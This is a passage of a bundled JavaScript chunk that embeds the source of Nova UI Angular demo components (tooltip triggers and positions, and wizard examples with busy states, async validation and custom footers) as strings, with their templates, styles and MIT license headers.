[nuiTooltipDisabled]="isDisabled"\n        (click)="tooltip.toggle()"\n        (mouseenter)="disableTooltip(true)"\n        i18n\n    >\n        <strong>Toggle</strong> Tooltip\n    </button>\n\n    <div class="d-flex align-items-start flex-column">\n        <button\n            nui-button\n            type="button"\n            size="compact"\n            displayStyle="action"\n            (click)="handleClick($event, tooltip)"\n            i18n\n        >\n            Click to <strong>show</strong> tooltip\n        </button>\n\n        <button\n            nui-button\n            type="button"\n            size="compact"\n            displayStyle="action"\n            (click)="tooltip.hide()"\n            i18n\n        >\n            Click to <strong>hide</strong> tooltip\n        </button>\n    </div>\n</div>\n'},76592:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { TooltipDirective } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-tooltip-trigger-example",\n    templateUrl: "tooltip-trigger.example.component.html",\n})\nexport class TooltipTriggerExampleComponent {\n    public tooltipText = "I am a Tooltip!";\n    public isDisabled = false;\n\n    constructor() {}\n\n    public disableTooltip(state: boolean): void {\n        this.isDisabled = state;\n        // We only set the tooltip to a disabled state above to hide the tooltip.\n        // Now we want to enable it back, so it works with the click event.\n        setTimeout(() => (this.isDisabled = !state), 0);\n    }\n\n    public handleClick(event: MouseEvent, tooltip: TooltipDirective): void {\n        event.stopPropagation();\n        tooltip.show();\n    }\n}\n'},83048:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row"><h3>Basic button</h3></div>\n    <div class="row">\n        <button\n            nui-button\n            type="button"\n            id="basic-tooltip"\n            nuiTooltip="Default tooltip"\n        >\n            Standard tooltip example\n        </button>\n    </div>\n\n    <div class="row"><h3>Custom position: left, bottom, right</h3></div>\n    <div class="row">\n        <button\n            nui-button\n            id="left-tooltip"\n            nuiTooltip="Left-side tooltip"\n            tooltipPlacement="left"\n            type="button"\n        >\n            Tooltip on the left\n        </button>\n        <button\n            nui-button\n            id="bottom-tooltip"\n            nuiTooltip="Bottom-placed tooltip"\n            tooltipPlacement="bottom"\n            type="button"\n        >\n            Tooltip on the bottom\n        </button>\n        <button\n            nui-button\n            id="right-tooltip"\n            nuiTooltip="Right-side tooltip"\n            tooltipPlacement="right"\n            type="button"\n        >\n            Tooltip on the right\n        </button>\n    </div>\n\n    <div class="row"><h3>Manual Triggering</h3></div>\n    <div class="row">\n        <span #tooltip="nuiTooltip" [nuiTooltip]="tooltipMessage"> </span>\n        <button\n            id="manual-tooltip"\n            nui-button\n            type="button"\n            (click)="tooltip.toggle()"\n        >\n            Manually toggle tooltip\n        </button>\n    </div>\n</div>\n'},45272:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tooltip-visual-test",\n    templateUrl: "./tooltip-visual-test.component.html",\n})\nexport class TooltipVisualTestComponent {\n    tooltipMessage =\n        "ThisTooltipHasBeenCalledManuallyWithCriticallyLongTooltipMessage";\n}\n'},43459:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiMessageModule,\n    NuiRadioModule,\n    NuiSwitchModule,\n    NuiTooltipModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    TooltipBasicExampleComponent,\n    TooltipDisabledExampleComponent,\n    TooltipDocsExampleComponent,\n    TooltipEllipsisExampleComponent,\n    TooltipPositionExampleComponent,\n    TooltipTriggerExampleComponent,\n    TooltipVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: TooltipDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "tooltip-basic",\n        component: TooltipBasicExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n    },\n    {\n        path: "tooltip-disabled",\n        component: TooltipDisabledExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n    },\n    {\n        path: "tooltip-ellipsis",\n        component: TooltipEllipsisExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n    },\n    {\n        path: "tooltip-position",\n        component: TooltipPositionExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n    },\n    {\n        path: "tooltip-trigger",\n        component: TooltipTriggerExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n    },\n    {\n        path: "tooltip-visual-test",\n        component: TooltipVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiTooltipModule,\n        NuiSwitchModule,\n        NuiRadioModule,\n        NuiDocsModule,\n        NuiMessageModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        TooltipBasicExampleComponent,\n        TooltipDocsExampleComponent,\n        TooltipDisabledExampleComponent,\n        TooltipEllipsisExampleComponent,\n        TooltipPositionExampleComponent,\n        TooltipTriggerExampleComponent,\n        TooltipVisualTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("tooltip"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class TooltipDemoModule {}\n'},5851:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./wizard-docs/wizard-docs.component";\nexport * from "./wizard-horizontal/wizard-horizontal.example.component";\nexport * from "./wizard-vertical-layout/wizard-vertical.example.component";\nexport * from "./wizard-custom-layout/wizard-custom.example.component";\nexport * from "./wizard-busy/wizard-busy.example.component";\nexport * from "./wizard-dialog/wizard-dialog.example.component";\nexport * from "./wizard-custom-footer/wizard-custom-footer.example.component";\nexport * from "./wizard-dynamic/wizard-dynamic.example.component";\nexport * from "./wizard-remove-step/wizard-remove-step.example.component";\nexport * from "./wizard-async-validation-form/wizard-async-form-validation.example.component";\nexport * from "./wizard-with-custom-icons/wizard-with-custom-icons.example.component";\nexport * from "./wizard-restore-state/wizard-restore-state.example.component";\nexport * from "./wizard-step-change/wizard-step-change.example.component";\nexport * from "./wizard-responsive-header/wizard-responsive-header.example.component";\nexport * from "./wizard-with-confirmation-dialog-on-cancel/wizard-with-confirmation-dialog-on-cancel.example.component";\nexport * from "./wizard-tooltip/wizard-tooltip.example.component";\nexport * from "./wizard-test/wizard-test.component";\n'},4207:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div nui-busy [busy]="busy">\n    <form [formGroup]="form" *ngIf="form">\n        <nui-wizard-horizontal #wizard>\n            <nui-wizard-step-v2\n                label="Person Details"\n                formGroupName="personDetails"\n                [stepControl]="form.get([\'personDetails\'])"\n            >\n                <nui-form-field\n                    class="p-5"\n                    [control]="form.get([\'personDetails\', \'name\'])"\n                    i18n-caption\n                    caption="Name"\n                >\n                    <nui-textbox formControlName="name"></nui-textbox>\n                    <nui-validation-message\n                        for="required"\n                        *ngIf="\n                            form.get([\'personDetails\', \'name\'])?.errors\n                                ?.required\n                        "\n                        i18n\n                    >\n                        This is required\n                    </nui-validation-message>\n                </nui-form-field>\n\n                <ng-template nuiWizardStepFooter>\n                    <ng-container\n                        *ngTemplateOutlet="wizardCancel"\n                    ></ng-container>\n                    <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n                </ng-template>\n            </nui-wizard-step-v2>\n\n            <nui-wizard-step-v2\n                formGroupName="contactDetails"\n                [stepControl]="form.get([\'contactDetails\'])"\n            >\n                <ng-template nuiWizardStepLabel>\n                    <span (click)="onNextClick(wizard.selected)"\n                        >Contact Details</span\n                    >\n                </ng-template>\n\n                <nui-form-field\n                    class="p-5"\n                    [control]="form.get([\'contactDetails\', \'email\'])"\n                    i18n-caption\n                    caption="Email"\n                >\n                    <nui-textbox\n                        type="email"\n                        formControlName="email"\n                    ></nui-textbox>\n                    <nui-validation-message\n                        for="required"\n                        *ngIf="\n                            form.get([\'contactDetails\', \'email\'])?.errors\n                                ?.required\n                        "\n                        i18n\n                    >\n                        This is required\n                    </nui-validation-message>\n\n                    <nui-validation-message\n                        for="email"\n                        *ngIf="\n                            form.get([\'contactDetails\', \'email\'])?.errors?.email\n                        "\n                        i18n\n                    >\n                        Invalid email\n                    </nui-validation-message>\n                </nui-form-field>\n\n                <ng-template nuiWizardStepFooter>\n                    <ng-container\n                        *ngTemplateOutlet="wizardCancel"\n                    ></ng-container>\n                    <ng-container\n                        *ngTemplateOutlet="wizardPrevious"\n                    ></ng-container>\n                    <button\n                        type="button"\n                        displayStyle="primary"\n                        nui-button\n                        (click)="finishWizard()"\n                        i18n\n                    >\n                        Finish\n                    </button>\n                </ng-template>\n            </nui-wizard-step-v2>\n\n            <ng-template #wizardCancel>\n                <button\n                    type="button"\n                    displayStyle="action"\n                    nui-button\n                    (click)="resetWizard()"\n                    i18n\n                >\n                    Cancel\n                </button>\n            </ng-template>\n\n            <ng-template #wizardPrevious>\n                <button\n                    type="button"\n                    nuiWizardPrevious\n                    nui-button\n                    icon="caret-left"\n                >\n                    Back\n                </button>\n            </ng-template>\n\n            <ng-template #wizardNext>\n                <button\n                    nuiWizardNext\n                    type="button"\n                    nui-button\n                    displayStyle="primary"\n                    icon="caret-right"\n                    iconRight="true"\n                    (click)="onNextClick(wizard.selected)"\n                >\n                    Next\n                </button>\n            </ng-template>\n        </nui-wizard-horizontal>\n    </form>\n\n    <nui-spinner\n        size="large"\n        i18n-message\n        message="Async Validation is firing..."\n    >\n    </nui-spinner>\n</div>\n'},68215:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\nimport { AbstractControl, FormBuilder, Validators } from "@angular/forms";\nimport { of } from "rxjs";\nimport { delay, take } from "rxjs/operators";\n\nimport {\n    ToastService,\n    WizardHorizontalComponent,\n    WizardStepV2Component,\n} from "@nova-ui/bits";\n\nconst fakeAsyncValidator = (c: AbstractControl) => of(null).pipe(delay(4000));\n\n@Component({\n    selector: "nui-wizard-async-form-validation-example",\n    templateUrl: "./wizard-async-form-validation.example.component.html",\n})\nexport class WizardAsyncFormValidationExampleComponent {\n    public busy: boolean;\n    public form;\n\n    @ViewChild("wizard") wizard: WizardHorizontalComponent;\n\n    constructor(\n        private formBuilder: FormBuilder,\n        private toastService: ToastService\n    ) {\n        this.form = this.formBuilder.group({\n            personDetails: this.formBuilder.group({\n                name: [\n                    "",\n                    [Validators.required, Validators.minLength(3)],\n                    [fakeAsyncValidator],\n                ],\n            }),\n            contactDetails: this.formBuilder.group({\n                email: ["", [Validators.required, Validators.email]],\n                phone: [""],\n            }),\n        });\n    }\n\n    public onNextClick(selected: WizardStepV2Component): void {\n        const { stepControl } = selected;\n\n        if (stepControl.status !== "PENDING") {\n            stepControl.markAllAsTouched();\n\n            return;\n        }\n\n        this.busy = true;\n        stepControl.statusChanges.pipe(take(1)).subscribe((status) => {\n            if (status === "VALID") {\n                this.wizard.next();\n                this.busy = false;\n            }\n        });\n    }\n\n    public finishWizard(): void {\n        this.toastService.success({\n            title: $localize`Success`,\n            message: $localize`Wizard was completed successfully`,\n            options: {\n                timeOut: 2000,\n            },\n        });\n    }\n\n    public resetWizard(): void {\n        this.wizard.reset();\n    }\n}\n'},23057:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div nui-busy [busy]="busy" class="example-container">\n    <div class="busy-content">\n        <nui-wizard-horizontal #wizard>\n            \x3c!--  content of the 1st step --\x3e\n            <nui-wizard-step-v2>\n                \x3c!-- define the label which is displayed on the header stepper --\x3e\n                <ng-template nuiWizardStepLabel>Make step busy</ng-template>\n\n                \x3c!-- content of the current step --\x3e\n                <p class="m-5" i18n>Welcome!</p>\n\n                \x3c!-- content of the footer --\x3e\n                <ng-template nuiWizardStepFooter>\n                    <ng-container\n                        *ngTemplateOutlet="wizardCancel"\n                    ></ng-container>\n                    <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n                </ng-template>\n            </nui-wizard-step-v2>\n\n            \x3c!--  content of the 2nd step --\x3e\n            <nui-wizard-step-v2>\n                \x3c!-- define the label which is displayed on the header stepper --\x3e\n                <ng-template nuiWizardStepLabel>Final</ng-template>\n\n                \x3c!-- content of the current step --\x3e\n                <div class="p-5">\n                    <nui-checkbox\n                        name="nui-demo-checkbox"\n                        i18n-title\n                        title="Check box with help text"\n                        i18n-hint\n                        hint="This is some help text"\n                        required="true"\n                        [value]="false"\n                        i18n\n                        >Check box with help text\n                    </nui-checkbox>\n                    <nui-checkbox\n                        name="nui-demo-checkbox-plain"\n                        [checked]="true"\n                        [value]="false"\n                        i18n\n                        >Plain checkbox\n                    </nui-checkbox>\n                </div>\n\n                \x3c!-- content of the footer --\x3e\n                <ng-template nuiWizardStepFooter>\n                    <ng-container\n                        *ngTemplateOutlet="wizardCancel"\n                    ></ng-container>\n                    <ng-container\n                        *ngTemplateOutlet="wizardPrevious"\n                    ></ng-container>\n                    <button\n                        type="button"\n                        displayStyle="primary"\n                        nui-button\n                        (click)="finishWizard()"\n                        i18n\n                    >\n                        Finish\n                    </button>\n                </ng-template>\n            </nui-wizard-step-v2>\n\n            <ng-template #wizardCancel>\n                <button\n                    type="button"\n                    displayStyle="action"\n                    nui-button\n                    (click)="resetWizard()"\n                    i18n\n                >\n                    Cancel\n                </button>\n            </ng-template>\n\n            <ng-template #wizardPrevious>\n                <button\n                    type="button"\n                    nuiWizardPrevious\n                    nui-button\n                    icon="caret-left"\n                >\n                    Back\n                </button>\n            </ng-template>\n\n            <ng-template #wizardNext>\n                <button\n                    nuiWizardNext\n                    type="button"\n                    nui-button\n                    displayStyle="primary"\n                    icon="caret-right"\n                    iconRight="true"\n                >\n                    Next\n                </button>\n            </ng-template>\n        </nui-wizard-horizontal>\n    </div>\n    <nui-spinner\n        id="nui-demo-spinner"\n        size="large"\n        i18n-message\n        message="Data is loading from remote server..."\n    ></nui-spinner>\n</div>\n\n<button\n    nui-button\n    type="button"\n    id="nui-demo-busy-button"\n    (click)="toggleStepBusy()"\n    i18n\n>\n    Toggle busy on current step\n</button>\n'},25277:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".example-container {\n    border: 1px orange dashed;\n}\n"},40605:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\n\nimport { ToastService, WizardHorizontalComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-v2-busy-example",\n    templateUrl: "./wizard-busy.example.component.html",\n    styleUrls: ["./wizard-busy.example.component.less"],\n})\nexport class WizardBusyExampleComponent {\n    public busy: boolean;\n\n    @ViewChild("wizard") private wizard: WizardHorizontalComponent;\n\n    constructor(private toastService: ToastService) {}\n\n    public resetWizard(): void {\n        this.wizard.reset();\n    }\n\n    public toggleStepBusy(): void {\n        this.busy = !this.busy;\n        setTimeout(() => {\n            this.busy = false;\n        }, 3000);\n    }\n\n    public finishWizard(): void {\n        this.toastService.success({\n            title: $localize`Success`,\n            message: $localize`Wizard was completed successfully`,\n            options: {\n                timeOut: 2000,\n            },\n        });\n    }\n}\n'},56769:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard-horizontal #wizard>\n    \x3c!--  content of the 1st step --\x3e\n    <nui-wizard-step-v2 i18n-label label="First step">\n        \x3c!-- content of the current step --\x3e\n        <div class="p-5">\n            <span i18n>This is the first step of our horizontal wizard</span>\n        </div>\n\n        \x3c!-- content of the footer --\x3e\n        <ng-template nuiWizardStepFooter>\n            <div class="custom-footer step_1">\n                <button\n                    class="btn-custom"\n                    nui-button\n                    type="button"\n                    icon="add"\n                    i18n\n                >\n                    Custom button 1\n                </button>\n                <span i18n\n                    >This is some custom content added in the footer for our\n                    first step</span\n                >\n                <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n                <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n            </div>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    \x3c!--  content of the final step --\x3e\n    <nui-wizard-step-v2 i18n-label label="Final step">\n        <div class="p-5">\n            <span i18n>We finally reached our last step!</span>\n        </div>\n        \x3c!-- Notice how both label and footer can be placed anywhere in the content of wizard step --\x3e\n        <ng-template nuiWizardStepFooter>\n            <div class="custom-footer step_2">\n                <span i18n\n                    >This is some custom content added in the footer for our\n                    second step</span\n                >\n                <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n                <button nui-button type="button" icon="remove" i18n>\n                    Custom button 2\n                </button>\n                <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n                <button\n                    type="button"\n                    displayStyle="primary"\n                    nui-button\n                    (click)="finishWizard()"\n                    i18n\n                >\n                    Finish\n                </button>\n            </div>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    <ng-template #wizardCancel>\n        <button\n            type="button"\n            displayStyle="action"\n            nui-button\n            (click)="resetWizard()"\n            i18n\n        >\n            Cancel\n        </button>\n    </ng-template>\n\n    <ng-template #wizardPrevious>\n        <button type="button" nuiWizardPrevious nui-button icon="caret-left">\n            Back\n        </button>\n    </ng-template>\n\n    <ng-template #wizardNext>\n        <button\n            nuiWizardNext\n            type="button"\n            nui-button\n            displayStyle="primary"\n            icon="caret-right"\n            iconRight="true"\n        >\n            Next\n        </button>\n    </ng-template>\n</nui-wizard-horizontal>\n'},49261:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".custom-footer {\n    width: 100%;\n    padding: 10px;\n    border: 1px transparent dashed;\n    color: white;\n    display: flex;\n\n    &.step_1 {\n        border-color: orange;\n\n        .btn-custom {\n            margin-right: auto;\n        }\n    }\n\n    &.step_2 {\n        border-color: green;\n    }\n\n    span {\n        color: black;\n        line-height: 30px;\n        margin-right: auto;\n    }\n\n    button {\n        margin-left: 15px;\n    }\n}\n"},40173:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\n\nimport { ToastService, WizardHorizontalComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-custom-footer-example",\n    templateUrl: "./wizard-custom-footer.example.component.html",\n    styleUrls: ["./wizard-custom-footer.example.component.less"],\n})\nexport class WizardCustomFooterExampleComponent {\n    @ViewChild("wizard") private wizard: WizardHorizontalComponent;\n\n    constructor(private toastService: ToastService) {}\n\n    public resetWizard(): void {\n        this.wizard.reset();\n    }\n\n    public finishWizard(): void {\n        this.toastService.success({\n            title: $localize`Success`,\n            message: $localize`Wizard was completed successfully`,\n            options: {\n                timeOut: 2000,\n            },\n        });\n    }\n}\n'},54346:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row custom-header">\n        <div class="col-9 p-0">\n            <div class="nui-wizard-horizontal-header-container">\n                <ng-container\n                    *ngFor="let step of steps; let i = index; let isLast = last"\n                >\n                    <nui-wizard-step-header\n                        class="nui-wizard-horizontal-header"\n                        (click)="step.select()"\n                        (keydown)="_onKeydown($event)"\n                        [tabIndex]="_getFocusIndex() === i ? 0 : -1"\n                        [id]="_getStepLabelId(i)"\n                        [attr.aria-posinset]="i + 1"\n                        [attr.aria-setsize]="steps.length"\n                        [attr.aria-controls]="_getStepContentId(i)"\n                        [attr.aria-selected]="selectedIndex === i"\n                        [attr.aria-label]="step.ariaLabel || null"\n                        [attr.aria-labelledby]="\n                            !step.ariaLabel && step.ariaLabelledby\n                                ? step.ariaLabelledby\n                                : null\n                        "\n                        [index]="i"\n                        [label]="step.label || step.stepLabel"\n                        [selected]="selectedIndex === i"\n                        [active]="\n                            step.completed || selectedIndex === i || !linear\n                        "\n                        [step]="step"\n                        [errorMessage]="step.errorMessage"\n                    >\n                    </nui-wizard-step-header>\n                    <div\n                        *ngIf="!isLast"\n                        class="nui-wizard-horizontal-line"\n                    ></div>\n                </ng-container>\n            </div>\n            <div class="nui-wizard-horizontal-content-container">\n                <h2>\n                    <ng-container\n                        *ngIf="selected.stepLabel"\n                        [ngTemplateOutlet]="selected.stepLabel.template"\n                    ></ng-container>\n                    <ng-container *ngIf="!selected.stepLabel">{{\n                        selected.label\n                    }}</ng-container>\n                </h2>\n                <div\n                    *ngFor="let step of steps; let i = index"\n                    [attr.tabindex]="selectedIndex === i ? 0 : null"\n                    class="nui-wizard-horizontal-content"\n                    role="tabpanel"\n                    [id]="_getStepContentId(i)"\n                    [attr.aria-labelledby]="_getStepLabelId(i)"\n                    [attr.aria-expanded]="selectedIndex === i"\n                >\n                    <ng-container\n                        [ngTemplateOutlet]="step.content"\n                    ></ng-container>\n                </div>\n            </div>\n        </div>\n        <div class="col-3 custom-summary">\n            <ng-content select="[summary]"></ng-content>\n            <div\n                *ngIf="selected.stepFooter"\n                class="row nui-wizard-horizontal-footer-container"\n            >\n                <wizard-footer [footer]="selected.stepFooter"></wizard-footer>\n            </div>\n        </div>\n    </div>\n</div>\n'},53250:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "../../../../../../src/styles/nui-framework-variables";\n@import (reference) "../../../../../../src/styles/mixins.less";\n\n.nui-wizard-custom-layout {\n    .container {\n        border: @nui-line-default solid;\n        .setCssVariable(border-color, nui-color-line-default);\n    }\n\n    .nui-wizard-step-header {\n        border: @nui-line-default solid;\n        border-radius: 5px;\n        .setCssVariable(border-color, nui-color-line-default);\n        .setCssVariable(background, nui-color-bg-content);\n        flex-direction: row-reverse;\n        justify-content: flex-end;\n       